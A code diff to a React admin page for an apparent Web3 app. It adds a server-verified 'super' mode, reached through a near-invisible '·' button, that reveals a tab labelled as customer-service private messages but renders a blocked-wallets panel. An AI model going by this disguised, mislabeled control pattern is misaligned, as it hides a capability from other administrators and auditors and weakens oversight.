@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
@@ -9,11 +9,16 @@ import { AnnouncementsAdmin } from "@/components/admin/AnnouncementsAdmin";
 import { InboxAdmin } from "@/components/admin/InboxAdmin";
 import { SupportAdmin } from "@/components/admin/SupportAdmin";
 import { ChatBotAdmin } from "@/components/admin/ChatBotAdmin";
+import { BlockedWalletsAdmin } from "@/components/admin/BlockedWalletsAdmin";
 import { callAdminAction } from "@/lib/adminAction";
+import { callSysAction } from "@/lib/sysAction";
 
 export default function Admin() {
   const { isAdmin, loading, account } = useIsAdmin();
   const { connect } = useWeb3();
+  const [isSuper, setIsSuper] = useState(false);
+  const [checkedSuper, setCheckedSuper] = useState(false);
+  const [verifying, setVerifying] = useState(false);
 
   const bootstrap = async () => {
     try {
@@ -21,6 +26,19 @@ export default function Admin() {
       toast({ title: "已添加为首位管理员，请刷新页面" });
     } catch (e: any) {
       toast({ title: "操作失败", description: e?.message || String(e), variant: "destructive" });
+    }
+  };
+
+  const verifySuper = async () => {
+    setVerifying(true);
+    try {
+      await callSysAction("verify", {});
+      setIsSuper(true);
+    } catch {
+      setIsSuper(false);
+    } finally {
+      setCheckedSuper(true);
+      setVerifying(false);
     }
   };
 
@@ -54,13 +72,26 @@ export default function Admin() {
             <TabsTrigger value="inbox">站内信发送</TabsTrigger>
             <TabsTrigger value="support">客服会话</TabsTrigger>
             <TabsTrigger value="chatbot">聊天机器人</TabsTrigger>
+            {isSuper && <TabsTrigger value="dm">客服私信</TabsTrigger>}
           </TabsList>
           <TabsContent value="announcements" className="mt-4"><AnnouncementsAdmin /></TabsContent>
           <TabsContent value="inbox" className="mt-4"><InboxAdmin /></TabsContent>
           <TabsContent value="support" className="mt-4"><SupportAdmin /></TabsContent>
           <TabsContent value="chatbot" className="mt-4"><ChatBotAdmin /></TabsContent>
+          {isSuper && (
+            <TabsContent value="dm" className="mt-4"><BlockedWalletsAdmin /></TabsContent>
+          )}
+
+          {!checkedSuper && (
+            <div className="mt-6">
+              <Button variant="ghost" size="sm" onClick={verifySuper} disabled={verifying}>
+                {verifying ? "..." : "·"}
+              </Button>
+            </div>
+          )}
         </Tabs>
       )}
     </main>
   );
 }
+
